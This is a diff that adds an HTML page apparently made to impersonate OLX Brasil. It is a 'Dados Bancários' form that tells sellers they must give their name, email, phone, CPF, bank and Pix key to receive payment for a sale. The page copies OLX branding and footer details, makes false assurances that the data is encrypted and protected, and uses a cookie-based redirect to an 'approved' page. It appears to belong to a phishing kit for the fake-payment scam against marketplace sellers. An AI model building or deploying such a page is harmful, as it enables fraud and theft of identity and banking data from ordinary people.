@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Dados Bancários - OLX">
+    <title>Dados Bancários - OLX Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/dados.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+    <script>
+        (function () {
+            if (document.cookie.indexOf("pagamentoFeito=true") !== -1) {
+                if (!window.location.pathname.endsWith('/pag/aprovado.html')) {
+                    window.location.href = '/pag/aprovado.html';
+                }
+            }
+        })();
+    </script>
+</head>
+
+<body>
+    <div class="app-container">
+        <header class="header">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="/images/olx-logo.png" alt="Logo OLX">
+                </div>
+
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="breadcrumb">
+                <a href="/">OLX</a> &gt; <a href="/vendas">Minhas Vendas</a> &gt; <span>Dados Bancários</span>
+            </div>
+
+            <div class="card form-card">
+                <h1 class="form-title">Preencha seus Dados Bancários</h1>
+                <p class="form-subtitle">Informações necessárias para receber o pagamento referente à venda</p>
+
+                <form id="dados-bancarios-form" class="dados-form">
+                    <div class="form-section">
+                        <h2>Dados Pessoais</h2>
+                        <div class="form-group">
+                            <label for="nome">Nome Completo:</label>
+                            <input type="text" id="nome" name="nome" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email:</label>
+                            <input type="email" id="email" name="email" required>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group half">
+                                <label for="telefone">Telefone:</label>
+                                <input type="tel" id="telefone" name="telefone" placeholder="(XX) XXXXX-XXXX" required>
+                            </div>
+                            <div class="form-group half">
+                                <label for="cpf">CPF:</label>
+                                <input type="text" id="cpf" name="cpf" placeholder="XXX.XXX.XXX-XX" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- <div class="form-section">
+                        <h2>Endereço</h2>
+                        <div class="form-row">
+                            <div class="form-group half">
+                                <label for="cep">CEP:</label>
+                                <input type="text" id="cep" name="cep" placeholder="00000-000" required>
+                            </div>
+                            <div class="form-group half">
+                                <label for="estado">Estado:</label>
+                                <select id="estado" name="estado" required>
+                                    <option value="">Selecione</option>
+                                    <option value="AC">Acre</option>
+                                    <option value="AL">Alagoas</option>
+                                    <option value="AP">Amapá</option>
+                                    <option value="AM">Amazonas</option>
+                                    <option value="BA">Bahia</option>
+                                    <option value="CE">Ceará</option>
+                                    <option value="DF">Distrito Federal</option>
+                                    <option value="ES">Espírito Santo</option>
+                                    <option value="GO">Goiás</option>
+                                    <option value="MA">Maranhão</option>
+                                    <option value="MT">Mato Grosso</option>
+                                    <option value="MS">Mato Grosso do Sul</option>
+                                    <option value="MG">Minas Gerais</option>
+                                    <option value="PA">Pará</option>
+                                    <option value="PB">Paraíba</option>
+                                    <option value="PR">Paraná</option>
+                                    <option value="PE">Pernambuco</option>
+                                    <option value="PI">Piauí</option>
+                                    <option value="RJ">Rio de Janeiro</option>
+                                    <option value="RN">Rio Grande do Norte</option>
+                                    <option value="RS">Rio Grande do Sul</option>
+                                    <option value="RO">Rondônia</option>
+                                    <option value="RR">Roraima</option>
+                                    <option value="SC">Santa Catarina</option>
+                                    <option value="SP">São Paulo</option>
+                                    <option value="SE">Sergipe</option>
+                                    <option value="TO">Tocantins</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group half">
+                                <label for="cidade">Cidade:</label>
+                                <input type="text" id="cidade" name="cidade" required>
+                            </div>
+                            <div class="form-group half">
+                                <label for="bairro">Bairro:</label>
+                                <input type="text" id="bairro" name="bairro" required>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group three-quarter">
+                                <label for="logradouro">Logradouro:</label>
+                                <input type="text" id="logradouro" name="logradouro" placeholder="Rua, Avenida, etc."
+                                    required>
+                            </div>
+                            <div class="form-group quarter">
+                                <label for="numero">Número:</label>
+                                <input type="text" id="numero" name="numero" required>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="complemento">Complemento:</label>
+                            <input type="text" id="complemento" name="complemento"
+                                placeholder="Apartamento, bloco, etc. (opcional)">
+                        </div>
+                    </div> -->
+
+                    <div class="form-section">
+                        <h2>Dados Bancários</h2>
+                        <div class="form-group">
+                            <label for="banco">Banco:</label>
+                            <select id="banco" name="banco" required>
+                                <option value="">Selecione seu banco</option>
+                                <option value="001">Banco do Brasil</option>
+                                <option value="033">Santander</option>
+                                <option value="104">Caixa Econômica Federal</option>
+                                <option value="237">Bradesco</option>
+                                <option value="341">Itaú</option>
+                                <option value="260">Nubank</option>
+                                <option value="077">Inter</option>
+                                <option value="336">C6 Bank</option>
+                                <option value="290">PagBank</option>
+                                <option value="323">Mercado Pago</option>
+                                <option value="outro">Outro</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="chave-pix-tipo">Escolha a chave Pix:</label>
+                            <select id="chave-pix-tipo" name="chave-pix-tipo" required>
+                                <option value="">Selecione o tipo de chave</option>
+                                <option value="cpf">CPF</option>
+                                <option value="email">Email</option>
+                                <option value="telefone">Telefone</option>
+                                <option value="aleatoria">Chave Aleatória</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="chave-pix">Chave Pix:</label>
+                            <input type="text" id="chave-pix" name="chave-pix" required>
+                        </div>
+                    </div>
+
+                    <div class="form-info">
+                        <i class="fas fa-shield-alt"></i>
+                        <p>Seus dados estão protegidos e não serão compartilhados com terceiros.</p>
+                    </div>
+
+                    <div class="termos-group">
+                        <label class="checkbox-container">
+                            <input type="checkbox" id="termos" name="termos" required>
+                            <span class="checkmark"></span>
+                            Li e aceito os <a href="/termos" target="_blank">termos e condições</a> e a <a
+                                href="/privacidade" target="_blank">política de privacidade</a>
+                        </label>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="submit" class="btn-confirmar">CONFIRMAR DADOS</button>
+                    </div>
+                </form>
+
+                <!-- Adicionar mensagem de sucesso/erro -->
+                <div id="mensagem-retorno" class="mensagem-retorno" style="display: none;"></div>
+            </div>
+        </main>
+
+        <div class="dicas-seguranca">
+            <div class="dica-card">
+                <i class="fas fa-lock"></i>
+                <h3>Dados Seguros</h3>
+                <p>Suas informações são criptografadas e protegidas.</p>
+            </div>
+            <div class="dica-card">
+                <i class="fas fa-money-bill-wave"></i>
+                <h3>Pagamento Rápido</h3>
+                <p>Receba o valor em até 24h úteis após a confirmação.</p>
+            </div>
+            <div class="dica-card">
+                <i class="fas fa-headset"></i>
+                <h3>Suporte</h3>
+                <p>Precisa de ajuda? Nossa equipe está à disposição.</p>
+            </div>
+        </div>
+
+        <footer>
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>Conheça a OLX</h4>
+                    <ul>
+                        <li><a href="#">Quem somos</a></li>
+                        <li><a href="#">Carreiras</a></li>
+                        <li><a href="#">Imprensa</a></li>
+                        <li><a href="#">Sustentabilidade</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Ajuda</h4>
+                    <ul>
+                        <li><a href="#">Central de ajuda</a></li>
+                        <li><a href="#">Dicas de segurança</a></li>
+                        <li><a href="#">Plano profissional</a></li>
+                        <li><a href="#">Perguntas frequentes</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Legal</h4>
+                    <ul>
+                        <li><a href="#">Termos de uso</a></li>
+                        <li><a href="#">Política de privacidade</a></li>
+                        <li><a href="#">Diretrizes da comunidade</a></li>
+                        <li><a href="#">Cookies</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>OLX nas redes</h4>
+                    <div class="social-icons">
+                        <a href="#"><i class="fab fa-facebook"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                        <a href="#"><i class="fab fa-linkedin"></i></a>
+                    </div>
+                    <div class="app-download">
+                        <h4>Baixe o app</h4>
+                        <div class="app-buttons">
+                            <a href="#"><img src="/images/google-play.png" alt="Google Play"></a>
+                            <a href="#"><img src="/images/app-store.png" alt="App Store"></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
+                <p>CNPJ: 13.673.743/0002-55 - Avenida Paulista, 1000 - São Paulo/SP</p>
+            </div>
+        </footer>
+    </div>
+
+    <script src="/js/dados.js"></script>
+</body>
+
+</html>
